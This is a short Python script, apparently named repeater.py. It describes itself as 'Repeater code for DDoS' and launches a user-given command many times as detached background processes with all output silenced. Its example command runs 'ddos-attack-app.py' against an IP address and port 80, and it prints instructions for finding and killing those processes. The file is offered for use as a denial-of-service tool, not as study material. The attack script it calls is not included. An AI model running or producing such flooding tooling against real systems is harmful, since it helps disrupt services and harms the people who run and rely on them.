import subprocess
import time
import sys
import os

def runBackground():
    print("")
    print("Repeater code for DDoS, run this repeater using sudo like: sudo python repeater.py")
    print("Example of repeated command: sudo python /home/kaled/Downloads/ddos-attack-app.py 192.168.8.40 80 200000")
    print("")
    repeatCommand = input("Enter the command: ")

    if not repeatCommand:
        print("Error: No command entered. Exiting.")
        sys.exit(1)
    
    try:
        numTimesString = input("Enter the number of times to repeat the command: ")
        numTimes = int(numTimesString)
        if numTimes <= 0:
            raise ValueError
    except ValueError:
        print("Please enter a positive integer.")
        sys.exit(1)

    print("")
    print(f"Starting to execute '{repeatCommand}' {numTimes} times in the background...")
    print("Output from the repeated commands will NOT appear in this terminal.")
    print("")

    processes = []
    for i in range(1, numTimes + 1):
        print(f"Launching instance {i}/{numTimes}...")
        try:
            commandArgs = repeatCommand.split()
            process = subprocess.Popen(
                commandArgs,
                stdout=subprocess.DEVNULL, 
                stderr=subprocess.DEVNULL, 
                stdin=subprocess.DEVNULL,  
                start_new_session=True     
            )
            processes.append(process)
            print(f"  PID: {process.pid}")
            time.sleep(0.1) 
        except FileNotFoundError:
            print(f"Error: Command '{commandArgs[0]}' not found. Make sure it's in your PATH or provide full path.")
            break
        except PermissionError:
            print(f"Error: Permission denied. Do you have 'sudo' correctly configured or the right permissions?")
            break
        except Exception as e:
            print(f"An unexpected error occurred: {e}")
            break

    print("")
    print(f"All {len(processes)} instances have been launched in the background.")
    print("To check them, use: ps aux | grep 'ddos-attack-app.py'")
    print("To stop them, use: sudo pkill -9 -f ddos-attack-app.py || true ; reset") # '|| true ; reset' to reset the terminal
    print("")

if __name__ == "__main__":
    runBackground()